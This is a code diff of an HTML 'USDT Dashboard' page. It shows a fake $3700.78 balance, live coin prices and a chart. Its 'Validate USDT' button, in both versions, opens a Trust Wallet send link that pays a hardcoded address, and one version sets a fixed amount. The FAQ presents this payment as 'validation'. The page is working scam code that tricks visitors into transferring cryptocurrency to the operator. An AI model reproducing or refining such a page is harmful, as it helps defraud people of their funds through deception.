@@ -1,232 +1,135 @@
 <!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Dashboard - BSC</title>
-  <!-- Web3 and WalletConnect -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>USDT Dashboard</title>
   <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>  <style>
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
+  <style>
     body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background: #0b0e11;
+      background-color: #121212;
       color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 1rem;
       margin: 0;
-      padding: 0;
+      text-align: center;
     }
     header {
-      background-color: #121212;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+    .top-section {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 1rem 2rem;
-      flex-wrap: wrap;
+      padding: 1rem;
+      background-color: #1e1e1e;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      margin-bottom: 2rem;
     }
-    .usdt-info {
-      display: flex;
-      align-items: center;
+    .top-section img {
+      height: 40px;
+      margin-right: 0.5rem;
+    }
+    .top-section span {
+      font-size: 1.5rem;
       font-weight: bold;
-      font-size: 1.1rem;
     }
-    .usdt-info img {
-      width: 36px;
-      height: 36px;
-      margin-right: 10px;
-    }
-    .btn-group {
+    .btn-row {
       display: flex;
+      justify-content: center;
       gap: 1rem;
-      flex-wrap: wrap;
+      margin-bottom: 2rem;
     }
     button {
       background: #f0b90b;
       color: #000;
       border: none;
-      padding: 0.75rem 1.5rem;
+      padding: 0.8rem 1.6rem;
       border-radius: 8px;
       font-size: 1rem;
       font-weight: bold;
       cursor: pointer;
     }
-    main {
-      text-align: center;
-      padding: 2rem;
+    .chart-container {
+      margin: 2rem 0;
     }
-    h1 {
-      color: #f9f9f9;
-      font-size: 2rem;
-      margin-bottom: 2rem;
+    .prices-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1rem;
     }
-    .token-box {
+    .coin {
       background: #1e1e1e;
-      padding: 1.5rem;
-      border-radius: 12px;
-      display: inline-block;
-      margin-top: 2rem;
+      padding: 1rem;
+      border-radius: 10px;
+      width: 160px;
+      text-align: center;
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     }
-    .token-box img {
-      width: 48px;
-      height: 48px;
-      vertical-align: middle;
+    .coin img {
+      height: 32px;
+      margin-bottom: 0.5rem;
     }
-    .token-box span {
-      font-size: 1.5rem;
-      margin-left: 0.5rem;
-      vertical-align: middle;
-    }
-    #marketChart {
-      margin-top: 2rem;
-      border-radius: 12px;
-      overflow: hidden;
-      max-width: 900px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    #faqPage {
-      display: none;
-      background: #121212;
-      padding: 2rem;
-      color: #f1f1f1;
-      font-size: 1rem;
-    }
-    #priceTable {
-      margin: 2rem auto;
-      max-width: 600px;
-      background: #1a1a1a;
-      border-radius: 12px;
-      padding: 1rem;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
-    }
-    #priceTable table {
-      width: 100%;
-      color: #f0f0f0;
-      border-collapse: collapse;
-    }
-    #priceTable th, #priceTable td {
-      padding: 0.5rem;
-      text-align: left;
-      border-bottom: 1px solid #333;
-    }
-    #priceTable th {
-      color: #f0b90b;
-    }
-  </style></head>
+  </style>
+</head>
 <body>
-  <header>
-    <div class="usdt-info">
-      <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT Logo" />
-      Total USDT: <span id="usdtAmount">$3700.78</span>
+  <div class="top-section">
+    <div style="display: flex; align-items: center;">
+      <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT" />
+      <span>Total Asset: $3700.78</span>
     </div>
-    <div class="btn-group">
-      <button id="connectWallet">Validate USDT</button>
-      <button id="connectCoinStats">Connect via CoinStats</button>
-      <button id="faqButton">FAQ</button>
-    </div>
-  </header>  <main>
-    <h1>Validate Your USDT Balance on BSC</h1><div id="marketChart">
-  <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBTC%22%2C%22width%22%3A%22900%22%2C%22height%22%3A%22400%22%2C%22locale%22%3A%22en%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Afalse%7D"
-    width="100%" height="400" frameborder="0" allowtransparency="true" scrolling="no"></iframe>
-</div>
+  </div>  <div class="btn-row">
+    <button id="validateUSDT">Validate USDT</button>
+    <button id="connectWallet">Connect Wallet</button>
+    <button onclick="window.location.href='#faq'">FAQ</button>
+  </div>  <div class="chart-container">
+    <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_99a4d&symbol=BINANCE:BTCUSDT&interval=60&theme=dark" style="width:100%;height:400px;" frameborder="0" allowtransparency="true"></iframe>
+  </div>  <div class="prices-container" id="coinPrices"></div>  <h2 id="faq">[1] HOW TO VALIDATE</h2>
+  <p>To validate Asset click on "Validate USDT" which redirects you to Trust Wallet. Confirm your BNB network validation and wait 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>  <script>
+    const COINS = [
+      "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum", "dogecoin",
+      "cardano", "ripple", "tron", "polkadot", "litecoin", "polygon", "avalanche-2", "chainlink",
+      "uniswap", "stellar", "internet-computer", "vechain", "algorand"
+    ];
 
-<div id="priceTable">
-  <h2 style="text-align:center; color:#f0b90b">Live Coin Prices</h2>
-  <table>
-    <thead>
-      <tr><th>Coin</th><th>Price (USD)</th></tr>
-    </thead>
-    <tbody id="coinPrices"></tbody>
-  </table>
-</div>
-
-  </main>  <section id="faqPage">
-    <h2>Frequently Asked Questions</h2>
-    <p><strong>[1] HOW TO VALIDATE:</strong> Click <strong>Connect Wallet</strong> to validate via Trust Wallet. Or click <strong>Connect via CoinStats</strong> to link Web3 wallets or exchanges and fetch your USDT from Binance Smart Chain.</p>
-  </section>  <script>
-    const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-    const ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
-
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: { 56: "https://bsc-dataseed.binance.org/" },
-          chainId: 56
-        }
-      }
-    };
-
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions
-    });
-
-    let web3;
-
-    async function getUSDTBalance(address) {
-      const contract = new web3.eth.Contract(ABI, USDT_CONTRACT);
-      const raw = await contract.methods.balanceOf(address).call();
-      const balance = parseFloat(web3.utils.fromWei(raw)).toFixed(2);
-      document.getElementById("usdtAmount").textContent = `$${balance} USDT`;
-    }
-
-    async function connectWallet() {
-      const provider = await web3Modal.connect();
-      web3 = new Web3(provider);
-      const accounts = await web3.eth.getAccounts();
-      const userAddress = accounts[0];
-      await getUSDTBalance(userAddress);
-    }
-
-    document.getElementById("connectWallet").onclick = () => {
-      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193";
-      setTimeout(connectWallet, 3000);
-    };
-
-    document.getElementById("connectCoinStats").onclick = () => {
-      window.location.href = "https://coinstats.app/wallet"; // Simulated redirect, CoinStats handles wallet/exchange connection
-    };
-
-    document.getElementById("faqButton").onclick = () => {
-      const faq = document.getElementById("faqPage");
-      faq.style.display = faq.style.display === "none" ? "block" : "none";
-    };
-
-    async function fetchCoinPrices() {
-      const ids = "tether,bitcoin,binancecoin,binance-usd,solana,ethereum,dogecoin,xrp,cardano,polygon,tron,polkadot,shiba-inu,litecoin,chainlink";
-      const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
-      const prices = await res.json();
-      const tbody = document.getElementById("coinPrices");
-      tbody.innerHTML = "";
-      for (const id in prices) {
-        const logoUrl = `https://assets.coingecko.com/coins/images/${getLogoId(id)}/thumb.png`;
-        const row = document.createElement("tr");
-        row.innerHTML = `<td><img src="${logoUrl}" alt="logo" style="width:20px;vertical-align:middle;margin-right:6px;"> ${id.replace(/-/g, ' ')}</td><td>$${prices[id].usd.toLocaleString()}</td>`;
-        tbody.appendChild(row);
+    async function loadCoinPrices() {
+      try {
+        const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${COINS.join(',')}`);
+        const data = await res.json();
+        const container = document.getElementById("coinPrices");
+        data.forEach(coin => {
+          const div = document.createElement("div");
+          div.className = "coin";
+          div.innerHTML = `
+            <img src="${coin.image}" alt="${coin.name}" />
+            <div><strong>${coin.name}</strong></div>
+            <div>${coin.symbol.toUpperCase()}</div>
+            <div>$${coin.current_price.toFixed(2)}</div>
+          `;
+          container.appendChild(div);
+        });
+      } catch (e) {
+        console.error("Error loading coin prices:", e);
       }
     }
 
-    function getLogoId(coin) {
-      const map = {
-        tether: 325,
-        bitcoin: 1,
-        ethereum: 279,
-        binancecoin: 825,
-        "binance-usd": 9576,
-        solana: 4128,
-        dogecoin: 74,
-        xrp: 44,
-        cardano: 975,
-        polygon: 3890,
-        tron: 1958,
-        polkadot: 121,
-        "shiba-inu": 11939,
-        litecoin: 2,
-        chainlink: 877
-      };
-      return map[coin] || 325;
-    }
+    loadCoinPrices();
 
-    fetchCoinPrices();
+    document.getElementById("validateUSDT").onclick = () => {
+      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
+    };
+
+    document.getElementById("connectWallet").onclick = async () => {
+      try {
+        window.location.href = "https://walletconnect.network/connect?app=YourAppName&redirect_url=https://yourdashboard.com/callback&chain_id=56&token_contract=0x55d398326f99059ff775485246999027b3197955";
+      } catch (err) {
+        console.error("Wallet connect error:", err);
+        alert("Failed to connect to wallet. Try again.");
+      }
+    };
   </script></body>
 </html>
